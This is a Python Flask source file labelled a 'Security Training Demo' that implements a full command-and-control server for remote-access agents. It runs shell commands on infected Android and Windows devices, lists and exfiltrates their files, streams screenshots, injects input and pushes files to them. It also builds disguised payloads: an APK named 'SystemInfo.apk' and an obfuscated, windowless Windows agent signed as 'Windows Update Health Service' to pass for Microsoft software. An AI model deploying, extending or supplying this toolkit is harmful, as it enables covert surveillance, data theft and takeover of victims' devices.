#!/usr/bin/env python3
"""
Security Training Demo — Web Dashboard + C2 Server + APK Builder

Usage:
    python3 web_server.py [port]

Default port: 8080

Opens a web dashboard at http://0.0.0.0:<port> with:
  - Live device connections & beacon log
  - Command panel to task connected devices
  - APK generator — enter an IP, builds & downloads a configured APK

FOR CORPORATE SECURITY TRAINING USE ONLY.
"""

import json
import os
import re
import shutil
import subprocess
import sys
import threading
import time
import uuid
from datetime import datetime
from pathlib import Path

from flask import Flask, jsonify, request, send_file, render_template, make_response

# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------
BASE_DIR = Path(__file__).resolve().parent.parent          # SecurityTrainingDemo/
APP_BUILD_GRADLE = BASE_DIR / "app" / "build.gradle.kts"
APK_OUTPUT = BASE_DIR / "app" / "build" / "outputs" / "apk" / "debug" / "app-debug.apk"
GRADLE_BIN = Path.home() / "gradle" / "gradle-8.5" / "bin" / "gradle"
ANDROID_HOME = Path.home() / "android-sdk"

# ---------------------------------------------------------------------------
# State
# ---------------------------------------------------------------------------
devices = {}          # ip -> {device info}
beacon_log = []       # list of beacon dicts (last 200)
beacon_seq = 0        # auto-increment beacon ID
pending_tasks = {}    # ip -> {task, message}
tunnel_events = {}    # ip -> threading.Event (signals when a task is ready)
tunnel_status = {}    # ip -> {connected: bool, last_poll: str}
blacklisted = set()   # IPs that have been removed — ignore their beacons
exfil_files = []      # list of {name, size, device, time, path}
build_lock = threading.Lock()
build_status = {"building": False, "last_error": "", "last_ip": ""}

EXFIL_DIR = Path(__file__).resolve().parent / "exfiltrated"
EXFIL_DIR.mkdir(exist_ok=True)

app = Flask(__name__, template_folder=str(Path(__file__).parent / "templates"),
            static_folder=str(Path(__file__).parent / "static"))


# ---------------------------------------------------------------------------
# Beacon endpoint (POST /beacon) — called by the Android app
# ---------------------------------------------------------------------------
@app.route("/beacon", methods=["POST"])
def beacon():
    data = request.get_json(silent=True) or {}
    client_ip = request.remote_addr
    if client_ip in blacklisted:
        return jsonify({"status": "rejected"}), 403
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    device_name = data.get("device", "Unknown")
    msg_type = data.get("type", "heartbeat")
    device_id = client_ip  # Always key by IP to avoid duplicates

    # Update device registry — merge with existing data
    existing = devices.get(device_id, {})
    devices[device_id] = {
        "ip": client_ip,
        "device": device_name if device_name != "Unknown" else existing.get("device", "Unknown"),
        "android_id": data.get("android_id", existing.get("android_id", "")),
        "android": data.get("android") or existing.get("android", "?"),
        "api": data.get("api") or existing.get("api", "?"),
        "fingerprint": data.get("fingerprint") or existing.get("fingerprint", ""),
        "last_seen": now,
        "battery": data.get("battery_pct") or existing.get("battery", "?"),
        "network": data.get("network_type") or existing.get("network", "?"),
        "apps_count": data.get("installed_apps_count") or existing.get("apps_count", "?"),
        "os_type": data.get("os_type") or existing.get("os_type", "android"),
        "tunnel": existing.get("tunnel", False),
    }

    # Store beacon
    global beacon_seq
    beacon_seq += 1
    entry = {
        "id": beacon_seq,
        "time": now,
        "ip": client_ip,
        "device": device_name,
        "type": msg_type,
        "data": data,
    }
    beacon_log.append(entry)
    if len(beacon_log) > 500:
        beacon_log.pop(0)

    print(f"  [{now}] Beacon from {client_ip} ({device_name}) — {msg_type}")

    # Check for pending task for this device
    response = {"status": "received"}
    task = pending_tasks.pop(device_id, None) or pending_tasks.pop(client_ip, None)
    if task:
        response.update(task)
        print(f"  → Sent task: {task.get('task','?')}")

    return jsonify(response)


# ---------------------------------------------------------------------------
# Dashboard
# ---------------------------------------------------------------------------
@app.route("/")
def dashboard():
    resp = make_response(render_template("dashboard.html"))
    resp.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    resp.headers["Pragma"] = "no-cache"
    resp.headers["Expires"] = "0"
    return resp


# ---------------------------------------------------------------------------
# API endpoints for the dashboard JS
# ---------------------------------------------------------------------------
@app.route("/api/devices")
def api_devices():
    result = []
    for did, info in devices.items():
        d = dict(info)
        d["id"] = did
        result.append(d)
    return jsonify(result)


@app.route("/api/remove_device", methods=["POST"])
def api_remove_device():
    data = request.get_json(silent=True) or {}
    target = data.get("target", "")
    if not target:
        return jsonify({"error": "target required"}), 400

    removed = False
    # Remove from devices
    if target in devices:
        del devices[target]
        removed = True
    # Remove from tunnel status
    tunnel_status.pop(target, None)
    # Cancel any pending tasks
    pending_tasks.pop(target, None)
    # Kill tunnel event if waiting
    ev = tunnel_events.pop(target, None)
    if ev:
        ev.set()
    # Remove from screen frames/streaming
    screen_frames.pop(target, None)
    screen_streaming.pop(target, None)

    # Blacklist the IP so it can't re-register
    blacklisted.add(target)

    if removed:
        print(f"  [REMOVE] Device {target} removed and blacklisted")
        return jsonify({"status": "removed", "target": target})
    return jsonify({"error": "device not found"}), 404


@app.route("/api/unblock_device", methods=["POST"])
def api_unblock_device():
    data = request.get_json(silent=True) or {}
    target = data.get("target", "")
    if not target:
        return jsonify({"error": "target required"}), 400
    blacklisted.discard(target)
    print(f"  [UNBLOCK] Device {target} unblocked")
    return jsonify({"status": "unblocked", "target": target})


@app.route("/api/beacons")
def api_beacons():
    limit = int(request.args.get("limit", 50))
    return jsonify(beacon_log[-limit:][::-1])


@app.route("/api/beacon/<int:idx>")
def api_beacon_detail(idx):
    if 0 <= idx < len(beacon_log):
        return jsonify(beacon_log[idx])
    return jsonify({"error": "not found"}), 404


@app.route("/api/send_task", methods=["POST"])
def api_send_task():
    data = request.get_json(silent=True) or {}
    target = data.get("target", "")
    task = data.get("task", "")
    message = data.get("message", "")

    if not target or not task:
        return jsonify({"error": "target and task required"}), 400

    payload = {"task": task}
    if message:
        payload["message"] = message
    # Pass through extra params for file operations
    if data.get("path"):
        payload["path"] = data["path"]
    if data.get("filename"):
        payload["filename"] = data["filename"]

    # Queue for both device_id and IP
    pending_tasks[target] = payload
    # Also queue by IP if target is a device_id
    for did, info in devices.items():
        if did == target:
            pending_tasks[info["ip"]] = payload
            # Wake tunnel if connected
            ev = tunnel_events.get(info["ip"])
            if ev:
                ev.set()

    # Wake tunnel for direct IP target
    ev = tunnel_events.get(target)
    if ev:
        ev.set()

    return jsonify({"status": "queued", "task": task, "target": target})


@app.route("/api/list_files", methods=["POST"])
def api_list_files():
    """Synchronous file listing: sends list_files task, waits for response, returns it."""
    data = request.get_json(silent=True) or {}
    target = data.get("target", "")
    path = data.get("path", "/sdcard/")

    if not target:
        return jsonify({"error": "target required"}), 400

    # Remember current beacon count before sending task
    before_seq = beacon_seq

    # Queue the task
    payload = {"task": "list_files", "path": path}
    pending_tasks[target] = payload
    for did, info in devices.items():
        if did == target:
            pending_tasks[info["ip"]] = payload
            ev = tunnel_events.get(info["ip"])
            if ev:
                ev.set()
    ev = tunnel_events.get(target)
    if ev:
        ev.set()

    # Resolve target IP for matching responses
    target_ip = target
    for did, info in devices.items():
        if did == target:
            target_ip = info["ip"]
            break

    # Poll beacon_log for the response (up to 15s)
    import time
    for _ in range(30):
        time.sleep(0.5)
        for entry in reversed(beacon_log):
            eid = entry.get("id", 0)
            if eid > before_seq and entry.get("data", {}).get("task") == "list_files":
                # Verify response is from the correct device
                if entry.get("ip") == target_ip or entry.get("data", {}).get("android_id") == target:
                    return jsonify(entry["data"])

    return jsonify({"error": "timeout", "path": path, "files": []})


@app.route("/api/exec", methods=["POST"])
def api_exec():
    """Synchronous shell command: sends shell_command task, waits for response."""
    data = request.get_json(silent=True) or {}
    target = data.get("target", "")
    command = data.get("command", "")

    if not target or not command:
        return jsonify({"error": "target and command required"}), 400

    before_seq = beacon_seq

    payload = {"task": "shell_command", "command": command}
    pending_tasks[target] = payload
    for did, info in devices.items():
        if did == target:
            pending_tasks[info["ip"]] = payload
            ev = tunnel_events.get(info["ip"])
            if ev:
                ev.set()
    ev = tunnel_events.get(target)
    if ev:
        ev.set()

    # Resolve target IP for matching responses
    target_ip = target
    for did, info in devices.items():
        if did == target:
            target_ip = info["ip"]
            break

    # Poll for response (up to 30s for long-running commands)
    import time
    for _ in range(60):
        time.sleep(0.5)
        for entry in reversed(beacon_log):
            eid = entry.get("id", 0)
            if eid > before_seq and entry.get("data", {}).get("task") == "shell_command":
                if entry.get("ip") == target_ip or entry.get("data", {}).get("android_id") == target:
                    return jsonify(entry["data"])

    return jsonify({"error": "timeout", "command": command, "stdout": "", "stderr": "No response from device"})


# ---------------------------------------------------------------------------
# Screen sharing — screenshot capture + remote control
# ---------------------------------------------------------------------------
screen_frames = {}  # ip -> {"data": bytes, "time": float, "width": 0, "height": 0}
screen_streaming = {}  # ip -> bool

@app.route("/api/screen_upload", methods=["POST"])
def api_screen_upload():
    """Receive a screenshot JPEG from the device."""
    client_ip = request.remote_addr
    data = request.get_data()
    if not data:
        return jsonify({"error": "no data"}), 400
    screen_frames[client_ip] = {"data": data, "time": time.time()}
    return jsonify({"status": "ok"})


@app.route("/api/screen_frame")
def api_screen_frame():
    """Return the latest screenshot JPEG for a target device."""
    target = request.args.get("target", "")
    if not target:
        return "no target", 400
    frame = screen_frames.get(target)
    if not frame:
        return "no frame", 404
    resp = make_response(frame["data"])
    resp.headers["Content-Type"] = "image/jpeg"
    resp.headers["Cache-Control"] = "no-cache, no-store"
    resp.headers["X-Frame-Time"] = str(frame["time"])
    return resp


@app.route("/api/screenshot", methods=["POST"])
def api_screenshot():
    """Request a single screenshot from a device. Waits for upload."""
    data = request.get_json(silent=True) or {}
    target = data.get("target", "")
    quality = data.get("quality", 40)
    if not target:
        return jsonify({"error": "target required"}), 400

    old_time = screen_frames.get(target, {}).get("time", 0)
    before_seq = beacon_seq

    payload = {"task": "screenshot", "quality": quality}
    pending_tasks[target] = payload
    for did, info in devices.items():
        if did == target:
            pending_tasks[info["ip"]] = payload
            ev = tunnel_events.get(info["ip"])
            if ev:
                ev.set()
    ev = tunnel_events.get(target)
    if ev:
        ev.set()

    # Wait for new frame upload OR beacon error (up to 10s)
    for _ in range(20):
        time.sleep(0.5)
        # Check if frame was uploaded
        frame = screen_frames.get(target)
        if frame and frame["time"] > old_time:
            return jsonify({"status": "ok", "size": len(frame["data"]), "time": frame["time"]})
        # Check if device sent an error via beacon
        for entry in reversed(beacon_log):
            eid = entry.get("id", 0)
            if eid <= before_seq:
                break
            d = entry.get("data", {})
            if d.get("task") == "screenshot" and d.get("error"):
                return jsonify({"error": d["error"]}), 200

    return jsonify({"error": "timeout"}), 504


@app.route("/api/screen_stream", methods=["POST"])
def api_screen_stream():
    """Start/stop continuous screenshot streaming."""
    data = request.get_json(silent=True) or {}
    target = data.get("target", "")
    action = data.get("action", "start")
    if not target:
        return jsonify({"error": "target required"}), 400
    if action == "stop":
        screen_streaming[target] = False
        return jsonify({"status": "stopped"})
    screen_streaming[target] = True
    return jsonify({"status": "started"})


@app.route("/api/input", methods=["POST"])
def api_input():
    """Send touch/key input to device via shell command."""
    data = request.get_json(silent=True) or {}
    target = data.get("target", "")
    input_type = data.get("type", "")
    if not target or not input_type:
        return jsonify({"error": "target and type required"}), 400

    if input_type == "tap":
        x = data.get("x", 0)
        y = data.get("y", 0)
        cmd = f"input tap {int(x)} {int(y)}"
    elif input_type == "swipe":
        x1, y1 = data.get("x1", 0), data.get("y1", 0)
        x2, y2 = data.get("x2", 0), data.get("y2", 0)
        duration = data.get("duration", 300)
        cmd = f"input swipe {int(x1)} {int(y1)} {int(x2)} {int(y2)} {int(duration)}"
    elif input_type == "key":
        keycode = data.get("keycode", "")
        cmd = f"input keyevent {int(keycode)}"
    elif input_type == "text":
        text = data.get("text", "")
        # Escape special chars for shell
        safe = text.replace("'", "'\\''")
        cmd = f"input text '{safe}'"
    else:
        return jsonify({"error": f"unknown input type: {input_type}"}), 400

    # Use the synchronous exec mechanism
    before_seq = beacon_seq
    payload = {"task": "shell_command", "command": cmd}
    pending_tasks[target] = payload
    for did, info in devices.items():
        if did == target:
            pending_tasks[info["ip"]] = payload
            ev = tunnel_events.get(info["ip"])
            if ev:
                ev.set()
    ev = tunnel_events.get(target)
    if ev:
        ev.set()

    for _ in range(20):
        time.sleep(0.5)
        for entry in reversed(beacon_log):
            eid = entry.get("id", 0)
            if eid > before_seq and entry.get("data", {}).get("task") == "shell_command":
                return jsonify({"status": "ok", "exit_code": entry["data"].get("exit_code", -1)})

    return jsonify({"status": "sent", "cmd": cmd})


@app.route("/api/build_status")
def api_build_status():
    return jsonify(build_status)


# ---------------------------------------------------------------------------
# File exfiltration — receive uploaded files from device
# ---------------------------------------------------------------------------
@app.route("/api/file_upload", methods=["POST"])
def api_file_upload():
    """Receive a file exfiltrated from the device (base64-encoded in JSON)."""
    import base64
    data = request.get_json(silent=True) or {}
    filename = data.get("filename", "unknown")
    content_b64 = data.get("content", "")
    device_name = data.get("device", "unknown")
    file_path = data.get("path", "")
    client_ip = request.remote_addr
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if not content_b64:
        return jsonify({"error": "no content"}), 400

    # Sanitize filename — prevent path traversal
    safe_name = re.sub(r'[^a-zA-Z0-9._\-]', '_', os.path.basename(filename))
    # Add timestamp prefix to avoid overwrite
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    save_name = f"{ts}_{safe_name}"
    save_path = EXFIL_DIR / save_name

    try:
        raw = base64.b64decode(content_b64)
        save_path.write_bytes(raw)
        size = len(raw)
    except Exception as e:
        return jsonify({"error": str(e)}), 400

    entry = {
        "name": save_name,
        "original": filename,
        "size": size,
        "device": device_name,
        "ip": client_ip,
        "time": now,
        "remote_path": file_path,
    }
    exfil_files.append(entry)
    print(f"  [{now}] FILE EXFIL: {filename} ({size} bytes) from {client_ip} ({device_name})")

    # Also log as beacon
    global beacon_seq
    beacon_seq += 1
    beacon_log.append({
        "id": beacon_seq,
        "time": now, "ip": client_ip, "device": device_name,
        "type": "file_upload",
        "data": {"type": "file_upload", "filename": filename, "size": size, "path": file_path},
    })

    return jsonify({"status": "received", "name": save_name, "size": size})


@app.route("/api/exfil_files")
def api_exfil_files():
    return jsonify(exfil_files[::-1])


@app.route("/api/exfil_download/<name>")
def api_exfil_download(name):
    # Sanitize to prevent directory traversal
    safe_name = os.path.basename(name)
    fpath = EXFIL_DIR / safe_name
    if not fpath.exists() or not fpath.is_file():
        return jsonify({"error": "not found"}), 404
    return send_file(str(fpath), as_attachment=True, download_name=safe_name)


@app.route("/api/push_file", methods=["POST"])
def api_push_file():
    """Upload a file from dashboard to push to a device."""
    import base64
    target = request.form.get("target", "")
    dest_path = request.form.get("dest_path", "/sdcard/Download/")
    f = request.files.get("file")

    if not target or not f:
        return jsonify({"error": "target and file required"}), 400

    content = f.read()
    b64 = base64.b64encode(content).decode("ascii")
    filename = f.filename or "file"

    payload = {
        "task": "download_file",
        "filename": filename,
        "dest_path": dest_path.rstrip("/") + "/" + filename,
        "content": b64,
    }

    pending_tasks[target] = payload
    for did, info in devices.items():
        if did == target:
            pending_tasks[info["ip"]] = payload
            ev = tunnel_events.get(info["ip"])
            if ev:
                ev.set()
    ev = tunnel_events.get(target)
    if ev:
        ev.set()

    print(f"  [PUSH] {filename} ({len(content)} bytes) → {target} → {dest_path}")
    return jsonify({"status": "queued", "filename": filename, "size": len(content)})


# ---------------------------------------------------------------------------
# Tunnel endpoint — long-poll for instant command delivery
# ---------------------------------------------------------------------------
@app.route("/tunnel", methods=["POST"])
def tunnel():
    """
    Long-poll endpoint. The Android TunnelService POSTs device data here.
    Server holds the connection open up to 30s or until a task is queued.
    Returns immediately if a task is already pending.
    """
    data = request.get_json(silent=True) or {}
    client_ip = request.remote_addr
    if client_ip in blacklisted:
        return jsonify({"task": ""}), 403
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    device_name = data.get("device", "Unknown")
    msg_type = data.get("type", "tunnel_poll")
    device_id = client_ip  # Always key by IP to avoid duplicates

    # Update device registry — merge with existing data
    existing = devices.get(device_id, {})
    devices[device_id] = {
        "ip": client_ip,
        "device": device_name if device_name != "Unknown" else existing.get("device", "Unknown"),
        "android_id": data.get("android_id", existing.get("android_id", "")),
        "android": data.get("android") or existing.get("android", "?"),
        "api": data.get("api") or existing.get("api", "?"),
        "fingerprint": data.get("fingerprint") or existing.get("fingerprint", ""),
        "last_seen": now,
        "battery": data.get("battery_pct") or existing.get("battery", "?"),
        "network": data.get("network_type") or existing.get("network", "?"),
        "apps_count": data.get("installed_apps_count") or existing.get("apps_count", "?"),
        "os_type": data.get("os_type") or existing.get("os_type", "android"),
        "tunnel": True,
    }

    # Track tunnel status
    tunnel_status[client_ip] = {"connected": True, "last_poll": now, "device": device_name}

    # Log beacon if it has real data (not just a poll)
    if msg_type != "tunnel_poll":
        global beacon_seq
        beacon_seq += 1
        entry = {"id": beacon_seq, "time": now, "ip": client_ip, "device": device_name, "type": msg_type, "data": data}
        beacon_log.append(entry)
        if len(beacon_log) > 500:
            beacon_log.pop(0)
        print(f"  [{now}] Tunnel data from {client_ip} ({device_name}) — {msg_type}")

    # Check if task already pending
    task = pending_tasks.pop(device_id, None)
    if task:
        print(f"  [{now}] Tunnel → instant delivery: {task.get('task','?')} → {client_ip}")
        return jsonify(task)

    # No task pending — wait up to 30s for one
    event = threading.Event()
    tunnel_events[client_ip] = event

    triggered = event.wait(timeout=30)

    # Clean up events
    tunnel_events.pop(client_ip, None)

    if triggered:
        # Task was queued while we were waiting
        task = pending_tasks.pop(device_id, None)
        if task:
            print(f"  [{now}] Tunnel → pushed: {task.get('task','?')} → {client_ip}")
            return jsonify(task)

    # Timeout — no task, just return empty
    return jsonify({"task": ""})


@app.route("/api/tunnels")
def api_tunnels():
    return jsonify(tunnel_status)


@app.route("/api/generate_apk", methods=["POST"])
def api_generate_apk():
    data = request.get_json(silent=True) or {}
    ip = data.get("ip", "").strip()
    port = str(data.get("port", "8080")).strip()

    # Validate IP
    if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip):
        return jsonify({"error": "Invalid IP address"}), 400
    if not re.match(r"^\d{1,5}$", port):
        return jsonify({"error": "Invalid port"}), 400

    if build_status["building"]:
        return jsonify({"error": "A build is already in progress"}), 409

    # Start build in background
    thread = threading.Thread(target=_build_apk, args=(ip, port), daemon=True)
    thread.start()

    return jsonify({"status": "building", "ip": ip, "port": port})


@app.route("/api/download_apk")
def api_download_apk():
    if not APK_OUTPUT.exists():
        return jsonify({"error": "No APK available. Generate one first."}), 404
    return send_file(str(APK_OUTPUT), as_attachment=True,
                     download_name="SystemInfo.apk",
                     mimetype="application/vnd.android.package-archive")


# ---------------------------------------------------------------------------
# APK builder
# ---------------------------------------------------------------------------
def _build_apk(ip: str, port: str):
    with build_lock:
        build_status["building"] = True
        build_status["last_error"] = ""
        build_status["last_ip"] = ip

        try:
            # Check prerequisites exist
            if not APP_BUILD_GRADLE.exists():
                build_status["last_error"] = "Android project not found on this server. Build APKs from the dev machine instead."
                print(f"  [BUILD] SKIP — no Android project at {APP_BUILD_GRADLE}")
                return
            if not GRADLE_BIN.exists():
                build_status["last_error"] = "Gradle not found. Install Android SDK + Gradle on this machine to build APKs."
                print(f"  [BUILD] SKIP — no Gradle at {GRADLE_BIN}")
                return

            # Read current build.gradle.kts
            content = APP_BUILD_GRADLE.read_text()

            # Replace BEACON_URL
            new_url = f"http://{ip}:{port}/beacon"
            content = re.sub(
                r'buildConfigField\("String",\s*"BEACON_URL",\s*"\\?"[^"]*\\?""\)',
                f'buildConfigField("String", "BEACON_URL", "\\"{new_url}\\"")',
                content,
            )
            APP_BUILD_GRADLE.write_text(content)

            # Build
            env = os.environ.copy()
            env["ANDROID_HOME"] = str(ANDROID_HOME)
            env["ANDROID_SDK_ROOT"] = str(ANDROID_HOME)

            result = subprocess.run(
                [str(GRADLE_BIN), "assembleDebug", "--no-daemon"],
                cwd=str(BASE_DIR),
                env=env,
                capture_output=True,
                text=True,
                timeout=300,
            )

            if result.returncode != 0:
                build_status["last_error"] = result.stderr[-1000:] if result.stderr else result.stdout[-1000:]
                print(f"  [BUILD] FAILED:\n{build_status['last_error']}")
            else:
                print(f"  [BUILD] SUCCESS — APK for {ip}:{port}")

        except Exception as e:
            build_status["last_error"] = str(e)
            print(f"  [BUILD] ERROR: {e}")
        finally:
            build_status["building"] = False


# ---------------------------------------------------------------------------
# EXE generator — cross-compile Windows agent with mingw-w64
# ---------------------------------------------------------------------------
WIN_AGENT_SRC = Path(__file__).resolve().parent / "win_agent.c"
EXE_OUTPUT_DIR = Path(__file__).resolve().parent / "builds"
EXE_OUTPUT_DIR.mkdir(exist_ok=True)

exe_build_status = {"building": False, "last_error": "", "last_ip": ""}
exe_build_lock = threading.Lock()


@app.route("/api/generate_exe", methods=["POST"])
def api_generate_exe():
    data = request.get_json(silent=True) or {}
    ip = data.get("ip", "").strip()
    port = str(data.get("port", "9090")).strip()

    if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip):
        return jsonify({"error": "Invalid IP address"}), 400
    if not re.match(r"^\d{1,5}$", port):
        return jsonify({"error": "Invalid port"}), 400

    if exe_build_status["building"]:
        return jsonify({"error": "An EXE build is already in progress"}), 409

    thread = threading.Thread(target=_build_exe, args=(ip, port), daemon=True)
    thread.start()

    return jsonify({"status": "building", "ip": ip, "port": port})


@app.route("/api/exe_build_status")
def api_exe_build_status():
    exe_path = EXE_OUTPUT_DIR / "agent.exe"
    return jsonify({
        "building": exe_build_status["building"],
        "last_error": exe_build_status["last_error"],
        "last_ip": exe_build_status["last_ip"],
        "available": exe_path.exists(),
        "size": exe_path.stat().st_size if exe_path.exists() else 0,
    })


@app.route("/api/download_exe")
def api_download_exe():
    exe_path = EXE_OUTPUT_DIR / "agent.exe"
    if not exe_path.exists():
        return jsonify({"error": "No EXE available. Generate one first."}), 404
    return send_file(str(exe_path), as_attachment=True,
                     download_name="SystemService.exe",
                     mimetype="application/octet-stream")


def _build_exe(ip: str, port: str):
    with exe_build_lock:
        exe_build_status["building"] = True
        exe_build_status["last_error"] = ""
        exe_build_status["last_ip"] = ip

        try:
            # Read C source and patch server host/port
            src = WIN_AGENT_SRC.read_text()
            src = src.replace("%%SERVER_HOST%%", ip)
            src = src.replace("%%SERVER_PORT%%", port)

            # Write patched source to temp file
            patched_src = EXE_OUTPUT_DIR / "win_agent_patched.c"
            patched_src.write_text(src)

            exe_path = EXE_OUTPUT_DIR / "agent.exe"

            # Compile resource file if present
            rc_file = WIN_AGENT_SRC.parent / "resource.rc"
            res_obj = EXE_OUTPUT_DIR / "resource.o"
            extra_objs = []
            if rc_file.exists():
                rc_result = subprocess.run(
                    ["x86_64-w64-mingw32-windres", str(rc_file), "-o", str(res_obj)],
                    capture_output=True, text=True, timeout=30,
                )
                if rc_result.returncode == 0:
                    extra_objs.append(str(res_obj))

            # Cross-compile with mingw-w64 (obfuscated build)
            result = subprocess.run(
                [
                    "x86_64-w64-mingw32-gcc",
                    "-O2", "-s",
                    "-mwindows",          # no console window
                    "-fno-ident",         # strip compiler ident
                    "-fno-asynchronous-unwind-tables",
                    "-fvisibility=hidden",
                    "-Wl,--no-insert-timestamp",
                    "-o", str(exe_path),
                    str(patched_src),
                ] + extra_objs + [
                    "-lwinhttp",
                    "-lws2_32",
                    "-ladvapi32",
                ],
                capture_output=True,
                text=True,
                timeout=60,
            )

            # Clean up temp files
            patched_src.unlink(missing_ok=True)
            res_obj.unlink(missing_ok=True)

            if result.returncode != 0:
                exe_build_status["last_error"] = result.stderr[-1000:] if result.stderr else "Unknown build error"
                print(f"  [EXE BUILD] FAILED:\n{exe_build_status['last_error']}")
            else:
                # Sign the EXE if cert/key exist
                sign_cert = WIN_AGENT_SRC.parent / "builds" / "sign_cert.pem"
                sign_key  = WIN_AGENT_SRC.parent / "builds" / "sign_key.pem"
                if sign_cert.exists() and sign_key.exists():
                    signed_path = EXE_OUTPUT_DIR / "agent_signed.exe"
                    sign_result = subprocess.run(
                        [
                            "osslsigncode", "sign",
                            "-certs", str(sign_cert),
                            "-key", str(sign_key),
                            "-n", "Windows Update Health Service",
                            "-i", "https://www.microsoft.com",
                            "-in", str(exe_path),
                            "-out", str(signed_path),
                        ],
                        capture_output=True, text=True, timeout=30,
                    )
                    if sign_result.returncode == 0:
                        signed_path.rename(exe_path)
                        print(f"  [EXE BUILD] Signed successfully")
                    else:
                        print(f"  [EXE BUILD] Signing failed (unsigned EXE kept): {sign_result.stderr[:200]}")

                size = exe_path.stat().st_size
                print(f"  [EXE BUILD] SUCCESS — {size:,} bytes for {ip}:{port}")

        except Exception as e:
            exe_build_status["last_error"] = str(e)
            print(f"  [EXE BUILD] ERROR: {e}")
        finally:
            exe_build_status["building"] = False


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080

    print(f"""
\033[96m╔══════════════════════════════════════════════════════════════╗
║   Security Training Demo — Web Dashboard                     ║
║   Dashboard:  http://0.0.0.0:{port}                            ║
║   Beacon EP:  http://0.0.0.0:{port}/beacon                     ║
║                                                              ║
║   Open the dashboard in your browser.                        ║
║   Press Ctrl+C to stop.                                      ║
╚══════════════════════════════════════════════════════════════╝\033[0m
""")

    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)


if __name__ == "__main__":
    main()
